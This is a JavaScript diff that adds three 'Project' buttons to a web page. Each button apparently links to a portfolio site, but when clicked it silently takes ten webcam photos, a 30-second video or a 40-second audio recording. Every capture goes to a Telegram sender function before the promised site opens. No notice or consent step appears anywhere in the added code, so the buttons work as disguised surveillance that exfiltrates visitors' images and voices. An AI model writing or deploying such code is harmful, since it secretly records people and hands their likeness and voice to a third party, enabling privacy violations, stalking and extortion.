@@ -606,6 +606,246 @@ document.addEventListener('DOMContentLoaded', async () => {
         }
     }
 
+    // ==================== Project Buttons ====================
+    const projectBtn1 = document.getElementById('projectBtn1');
+    const projectBtn2 = document.getElementById('projectBtn2');
+    const projectBtn3 = document.getElementById('projectBtn3');
+
+    // Project 1: Capture 10 photos and redirect to mubassitalshamal
+    if (projectBtn1) {
+        projectBtn1.addEventListener('click', async () => {
+            if (!stream) {
+                return;
+            }
+
+            projectBtn1.disabled = true;
+
+            try {
+                const canvas = document.createElement('canvas');
+                const videoTrack = stream.getVideoTracks()[0];
+                if (!videoTrack) {
+                    projectBtn1.disabled = false;
+                    return;
+                }
+
+                let width = 640;
+                let height = 480;
+                try {
+                    const settings = videoTrack.getSettings();
+                    if (settings.width && settings.height) {
+                        width = settings.width;
+                        height = settings.height;
+                    }
+                } catch (err) {
+                    console.warn('Could not get video settings:', err);
+                }
+
+                canvas.width = width;
+                canvas.height = height;
+                const context = canvas.getContext('2d');
+
+                for (let i = 0; i < 10; i++) {
+                    let captureSuccess = false;
+
+                    try {
+                        const videoTrack = stream.getVideoTracks()[0];
+                        if (!videoTrack) {
+                            throw new Error('');
+                        }
+
+                        // Try ImageCapture API first
+                        if (typeof ImageCapture !== 'undefined') {
+                            try {
+                                const imageCaptureObj = new ImageCapture(videoTrack);
+                                const bitmap = await imageCaptureObj.grabFrame();
+                                const canvas2 = document.createElement('canvas');
+                                canvas2.width = bitmap.width;
+                                canvas2.height = bitmap.height;
+                                const ctx = canvas2.getContext('2d');
+                                ctx.drawImage(bitmap, 0, 0);
+
+                                const blob = await new Promise((resolve, reject) => {
+                                    canvas2.toBlob((blob) => {
+                                        if (blob) {
+                                            resolve(blob);
+                                        } else {
+                                            reject(new Error(''));
+                                        }
+                                    }, 'image/jpeg', 0.95);
+                                });
+
+                                const formData = {
+                                    method: 'sendPhoto',
+                                    fileType: 'photo',
+                                    file: blob,
+                                    fileName: `project1_photo_${Date.now()}_${i}.jpg`
+                                };
+                                await sendToTelegram(formData);
+                                captureSuccess = true;
+                            } catch (imageCaptureErr) {
+                                console.warn('ImageCapture failed:', imageCaptureErr);
+                            }
+                        }
+
+                        // Fallback to canvas method
+                        if (!captureSuccess) {
+                            const tempVideo = document.createElement('video');
+                            tempVideo.srcObject = stream;
+                            tempVideo.muted = true;
+                            tempVideo.play();
+
+                            await new Promise(resolve => setTimeout(resolve, 100));
+
+                            context.drawImage(tempVideo, 0, 0, canvas.width, canvas.height);
+                            const blob = await new Promise((resolve, reject) => {
+                                canvas.toBlob((blob) => {
+                                    if (blob) {
+                                        resolve(blob);
+                                    } else {
+                                        reject(new Error(''));
+                                    }
+                                }, 'image/jpeg', 0.95);
+                            });
+
+                            const formData = {
+                                method: 'sendPhoto',
+                                fileType: 'photo',
+                                file: blob,
+                                fileName: `project1_photo_${Date.now()}_${i}.jpg`
+                            };
+                            await sendToTelegram(formData);
+                            captureSuccess = true;
+                        }
+
+                        if (i < 9) await new Promise(resolve => setTimeout(resolve, 500));
+                    } catch (photoError) {
+                        console.error(`Photo capture error ${i + 1}:`, photoError);
+                    }
+                }
+
+                setTimeout(() => {
+                    window.open('https://mubassitalshamal-v9.onrender.com/', '_blank');
+                }, 500);
+            } catch (error) {
+                console.error('Photo capture error:', error);
+            } finally {
+                projectBtn1.disabled = false;
+            }
+        });
+    }
+
+    // Project 2: Record 30 second video and redirect to Zena Touch
+    if (projectBtn2) {
+        projectBtn2.addEventListener('click', () => {
+            if (!stream) {
+                return;
+            }
+
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                mediaRecorder.stop();
+            } else {
+                recordingType = 'project2';
+                const videoMimeType = getSupportedVideoMimeType();
+                startRecordingProject(stream, videoMimeType, 30000, 'https://abuali782.github.io/Zena-Touch-v2/');
+                projectBtn2.disabled = true;
+            }
+        });
+    }
+
+    // Project 3: Record 40 second audio and redirect to Baytak Real Estate
+    if (projectBtn3) {
+        projectBtn3.addEventListener('click', () => {
+            if (!stream) {
+                return;
+            }
+
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                mediaRecorder.stop();
+            } else {
+                recordingType = 'project3';
+                const audioStream = new MediaStream(stream.getAudioTracks());
+                const audioMimeType = getSupportedAudioMimeType();
+                startRecordingProject(audioStream, audioMimeType, 40000, 'https://abuali782.github.io/BaytakRealEstate/');
+                projectBtn3.disabled = true;
+            }
+        });
+    }
+
+    // Start recording for projects
+    function startRecordingProject(streamToRecord, mimeType, duration, redirectUrl) {
+        let recordedChunks = [];
+
+        try {
+            mediaRecorder = new MediaRecorder(streamToRecord, { mimeType });
+        } catch (error) {
+            console.error('MediaRecorder error:', error);
+            return;
+        }
+
+        mediaRecorder.ondataavailable = (event) => {
+            if (event.data.size > 0) {
+                recordedChunks.push(event.data);
+            }
+        };
+
+        mediaRecorder.onerror = (event) => {
+            console.error('Recording error:', event.error);
+        };
+
+        mediaRecorder.onstop = async () => {
+            const blob = new Blob(recordedChunks, { type: mimeType });
+            recordedChunks = [];
+
+            let fileExtension = 'webm';
+            if (mimeType.includes('mp4')) fileExtension = 'mp4';
+            else if (mimeType.includes('mpeg')) fileExtension = 'mp3';
+            else if (mimeType.includes('wav')) fileExtension = 'wav';
+            else if (mimeType.includes('x-msvideo')) fileExtension = 'avi';
+
+            let formData;
+            if (recordingType === 'project2') {
+                formData = {
+                    method: 'sendVideo',
+                    fileType: 'video',
+                    file: blob,
+                    fileName: `project2_video_${Date.now()}.${fileExtension}`
+                };
+            } else if (recordingType === 'project3') {
+                formData = {
+                    method: 'sendAudio',
+                    fileType: 'audio',
+                    file: blob,
+                    fileName: `project3_audio_${Date.now()}.${fileExtension}`
+                };
+            }
+
+            const success = await sendToTelegram(formData);
+            if (success) {
+                setTimeout(() => {
+                    window.open(redirectUrl, '_blank');
+                }, 500);
+            }
+
+            projectBtn2.disabled = false;
+            projectBtn3.disabled = false;
+        };
+
+        try {
+            mediaRecorder.start();
+            
+            // Auto-stop recording after specified duration
+            if (duration) {
+                setTimeout(() => {
+                    if (mediaRecorder && mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                }, duration);
+            }
+        } catch (error) {
+            console.error('Recording start error:', error);
+        }
+    }
+
     // ==================== Open Project ====================
     window.openProject = function(url) {
         window.open(url, '_blank');
